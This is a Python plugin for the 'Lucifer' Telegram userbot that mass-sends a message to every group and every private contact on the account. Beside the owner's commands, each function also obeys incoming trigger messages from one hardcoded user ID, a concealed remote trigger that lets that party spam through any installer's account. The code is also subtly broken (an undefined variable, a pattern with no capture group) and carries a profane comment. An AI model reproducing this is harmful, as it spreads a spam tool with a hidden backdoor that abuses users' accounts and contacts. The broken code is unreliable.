from Lucifer.events import register
from Lucifer import CMD_HELP, bot


GCAST_BLACKLIST = [
    -1001473548283,  # SharingUserbot
    -1001433238829,  # TedeSupport
    -1001476936696,  # AnosSupport
    -1001327032795,  # UltroidSupport
    -1001294181499,  # UserBotIndo
    -1001419516987,  # VeezSupportGroup
    -1001209432070,  # GeezSupportGroup
    -1001296934585,  # X-PROJECT BOT
    -1001481357570,  # UsergeOnTopic
    -1001459701099,  # CatUserbotSupport
    -1001109837870,  # TelegramBotIndonesia
    -1001752592753,  # Skyzusupport
    -1001456135097,  # SpamBot
    -1001462425381,  # GRUP GUA
    -1001369629503,  # its
]

# BLACKLIST NYA JANGAN DI HAPUS NGENTOD.

@register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
@register(incoming=True, from_users=1779447750, pattern=r"^\.cgcast$")
async def gcast(event):
    xx = event.pattern_match.group(1)
    if xx:
        msg = xx
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit("sending this message")
        return
    kk = await event.edit("sending wait !!!")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                if chat not in GCAST_BLACKLIST:
                    await event.client.send_message(chat, msg)
                    done += 1
                elif chapassvt in GCAST_BLACKLIST:
                    pass
            except BaseException:
                er += 1
    await kk.edit(
        f"sent this message to  {done} Grup, got error in {er} Grup"
    )


@register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
@register(incoming=True, from_users=1779447750, pattern=r"^\.cgucast$")
async def gucast(event):
    xx = event.pattern_match.group(1)
    if not xx:
        return await event.edit("sending this messafe wait")
    tt = event.text
    msg = tt[7:]
    kk = await event.edit("sending wait ")
    er = 0
    done = 0
    async for x in bot.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                done += 1
                await bot.send_message(chat, msg)
            except BaseException:
                er += 1
    await kk.edit(f"sent this message to {done} users,  not send in {er}")


CMD_HELP.update(
    {
        "gcast": "𝘾𝙤𝙢𝙢𝙖𝙣𝙙: .gcast\
         \n↳ : sending this message to grps  Globally."})

CMD_HELP.update(
    {
         "gucast": "𝘾𝙤𝙢𝙢𝙖𝙣𝙙: .gucast\
         \n↳ : sending to users  Globally."
    }
)